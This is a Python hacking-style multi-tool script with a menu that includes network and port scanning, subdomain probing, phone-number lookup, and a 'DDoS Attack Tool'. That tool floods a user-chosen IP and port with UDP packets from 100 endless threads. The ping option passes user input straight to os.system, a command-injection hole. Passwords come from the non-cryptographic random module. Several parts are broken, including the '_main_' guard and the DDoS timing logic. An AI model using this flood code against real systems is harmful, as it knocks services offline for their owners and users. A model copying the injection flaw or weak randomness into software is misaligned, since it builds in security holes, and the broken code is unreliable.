import os
import socket
import ipaddress
import barcode
from barcode.writer import ImageWriter
import qrcode
import random
import string
import phonenumbers
from phonenumbers import geocoder, carrier
import requests
import threading
def network_scanner():
    def scan_host(ip):
        try:
            socket.gethostbyaddr(ip)
            return True
        except socket.herror:
            return False

    def scan_ports(ip):
        open_ports = []
        for port in range(1, 1025):
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                if s.connect_ex((ip, port)) == 0:
                    open_ports.append(port)
        return open_ports

    network = input("Enter the network range (e.g., 192.168.1.0/24): ")
    for ip in ipaddress.IPv4Network(network, strict=False):
        ip = str(ip)
        if scan_host(ip):
            print(f"Host {ip} is live.")
            open_ports = scan_ports(ip)
            if open_ports:
                print(f"Open ports on {ip}: {open_ports}")
            else:
                print(f"No open ports on {ip}.")
        else:
            print(f"Host {ip} is not live.")

def ip_scanner():
    ip = input("Enter IP to ping: ")
    response = os.system(f"ping -c 1 {ip}")
    if response == 0:
        print(f"{ip} is live.")
    else:
        print(f"{ip} is not reachable.")

def generate_barcode():
    data = input("Enter data for barcode: ")
    filename = input("Enter filename to save barcode: ")
    CODE128 = barcode.get_barcode_class('code128')
    barcode_obj = CODE128(data, writer=ImageWriter())
    barcode_obj.save(filename)
    print("Barcode saved!")

def generate_qr():
    data = input("Enter data for QR code: ")
    filename = input("Enter filename to save QR code: ")
    qr = qrcode.QRCode(version=1, box_size=10, border=5)
    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image(fill='black', back_color='white')
    img.save(filename)
    print("QR code saved!")

def password_generator():
    length = int(input("Enter password length: "))
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for _ in range(length))
    print(f"Generated Password: {password}")

def wordlist_generator():
    words = input("Enter words separated by commas: ").split(',')
    output_file = input("Enter filename to save wordlist: ")
    with open(output_file, 'w') as f:
        for word in words:
            f.write(word + '\n')
    print("Wordlist saved!")

def phone_info():
    number = input("Enter phone number with country code: ")
    phone = phonenumbers.parse(number)
    location = geocoder.description_for_number(phone, 'en')
    carrier_name = carrier.name_for_number(phone, 'en')
    print(f"Location: {location}, Carrier: {carrier_name}")

def subdomain_checker():
    domain = input("Enter domain: ")
    subdomains = input("Enter subdomains separated by commas: ").split(',')
    for subdomain in subdomains:
        url = f"http://{subdomain}.{domain}"
        try:
            response = requests.get(url)
            if response.status_code == 200:
                print(f"Found: {url}")
        except requests.ConnectionError:
            pass

def ddos_attack():
    target_ip = input("Enter target IP: ")
    port = int(input("Enter port: "))
    duration = int(input("Enter duration in seconds: "))
    
    def attack():
        while True:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.sendto(b"Attack!", (target_ip, port))

    print("Starting DDoS attack...")
    timeout = threading.Event()
    timeout.wait(timeout=duration)
    for _ in range(100):
        thread = threading.Thread(target=attack)
        thread.start()
    print("DDoS attack ended.")

def main():
    while True:
        print("\nMenu:")
        print("1. Network and Port Scanner")
        print("2. IP Scanner")
        print("3. Generate Barcode")
        print("4. Generate QR Code")
        print("5. Generate Password")
        print("6. Generate Wordlist")
        print("7. Phone Number Information")
        print("8. Subdomain Checker")
        print("9. DDoS Attack Tool")
        print("10. Exit")
        
        choice = input("Enter your choice: ")
        if choice == '1':
            network_scanner()
        elif choice == '2':
            ip_scanner()
        elif choice == '3':
            generate_barcode()
        elif choice == '4':
            generate_qr()
        elif choice == '5':
            password_generator()
        elif choice == '6':
            wordlist_generator()
        elif choice == '7':
            phone_info()
        elif choice == '8':
            subdomain_checker()
        elif choice == '9':
            ddos_attack()
        elif choice == '10':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "_main_":
    main()